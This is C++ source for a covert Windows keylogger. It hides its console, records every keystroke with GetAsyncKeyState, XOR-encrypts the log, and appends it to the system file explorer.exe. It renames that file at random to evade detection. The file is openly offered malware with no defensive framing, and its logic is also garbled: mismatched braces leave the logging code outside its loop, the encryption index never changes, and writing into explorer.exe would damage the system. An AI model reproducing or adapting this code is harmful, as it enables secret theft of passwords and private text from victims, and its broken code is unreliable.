#include <iostream>
#include <fstream>
#include <windows.h>
using namespace std;

int main()
{
    char KEY = 'x';
    string log = "";

    // Hide the console window
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, 0);

    // Set the file attributes to hidden
    SetFileAttributes("update.exe", FILE_ATTRIBUTE_HIDDEN);

    while (true)
    {
        Sleep(10);

        for (int KEY = 8; KEY <= 255; KEY++)
        {
            if (GetAsyncKeyState(KEY) == -32767)
            {
                if (KEY == 13) // Carriage return (Enter)
                {
                    log += '\n';
                }
                else if (KEY == 32) // Space
                {
                    log += ' ';
                }
                else if (KEY == VK_BACK) // Backspace
                {
                    log = log.substr(0, log.length() - 1);
                }
                else if (KEY == VK_SHIFT)
                {
                    log += "[SHIFT]";
                }
                else if (KEY == VK_CAPITAL)
                {
                    log += "[CAPSLOCK]";
                }
                else if (KEY == VK_TAB)
                {
                    log += "[TAB]";
                }
                else if (KEY == VK_CONTROL)
                {
                    log += "[CTRL]";
                }
                else if (KEY == VK_ESCAPE)
                {
                    log += "[ESC]";
                }
                else if (KEY == VK_END)
                {
                    log += "[END]";
                }
                else if (KEY == VK_HOME)
                {
                    log += "[HOME]";
                }
                else if (KEY == VK_LEFT)
                {
                    log += "[LEFT]";
                }
                else if (KEY == VK_UP)
                {
                    log += "[UP]";
                }
                else if (KEY == VK_RIGHT)
                {
                    log += "[RIGHT]";
                }
                else if (KEY == VK_DOWN)
                {
                    log += "[DOWN]";
                }
                else if (KEY == VK_OEM_PERIOD)
                {
                    log += '.';
                }
                else if (KEY == VK_OEM_COMMA)
                {
                    log += ',';
                }
                else if (KEY == VK_OEM_1)
                {
                    log += ';';
                }
                else if (KEY == VK_OEM_2)
                {
                    log += '/';
                }
                else if (KEY == VK_OEM_3)
                {
                    log += '`';
                }
                else if (KEY == VK_OEM_4)
                {
                    log += '[';
                }
                else if (KEY == VK_OEM_5)
                {
                    log += '\\';
                }
                else if (KEY == VK_OEM_6)
                {
                    log += ']';
                }
                else if (KEY == VK_OEM_7)
                {
                    log += '\'';
                }
                else if (KEY >= 48 && KEY <= 57) // Numeric keys
                {
                    log += KEY;
                }
                else if (KEY >= 65 && KEY <= 90) // Alphabetic keys
                {
                    if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0) // Caps Lock
                    {
                        log += KEY;
                    }
                    else
                    {
                        log += (KEY + 32);
                    }
                }
                else
                {
                    log += "[" + to_string(KEY) + "]";
                }
            }
        }

        // Encrypt and store the captured data in a hidden location
    // Encrypt and store the captured data in a hidden location
    string key = "evil"; // Encryption key
    string encryptedLog = "";
    for (char& c : log)
    {
        encryptedLog += c ^ key[key.size() % 4];
    }

    // Append the encrypted data to a harmless-looking file
    ofstream outfile;
    outfile.open("C:\\Windows\\system32\\explorer.exe", ios::app);
    outfile << encryptedLog;

    // Clear the log
    log = "";

    // Wait for 5 seconds before capturing the next keystrokes
    Sleep(5000);

    // Periodically change the file name and location to evade detection
    if (rand() % 100 == 0) // Random chance of changing the file name and location
    {
        string newName = "update" + to_string(rand() % 1000) + ".exe"; // Generate a random file name
        string newPath = "C:\\Windows\\system32\\" + newName; // Generate a random file path
        rename("C:\\Windows\\system32\\explorer.exe", newPath.c_str()); // Rename the file
        SetFileAttributes(newPath.c_str(), FILE_ATTRIBUTE_HIDDEN); // Set the file attributes to hidden
    }
}

return 0;
}
